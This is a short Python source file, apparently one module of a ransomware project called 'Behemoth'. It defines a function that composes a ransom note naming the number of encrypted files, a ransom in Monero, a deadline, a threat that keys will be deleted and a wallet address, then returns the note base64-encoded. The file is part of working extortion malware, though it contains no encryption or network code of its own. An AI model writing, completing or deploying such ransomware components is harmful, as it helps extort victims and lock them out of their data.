from base64 import b64encode


def instruct(payment, deadline, wallet, files):
    textwall = f"Your files has been encrypted with Behemoth ransomware.\nWe have encrypted about {files} of your files. " \
               f"In order to decrypt themyou have to pay a ransom of {payment} in form of Monero or XMR and " \
               f"send it to use.\n\nYou have to send this about by {deadline} or else your keys will be deleted " \
               f"from our database and your files will be unrecoverable.\nSend the ransom to this address: {wallet}\n"
    return b64encode(textwall.encode('utf8')).decode('utf8')


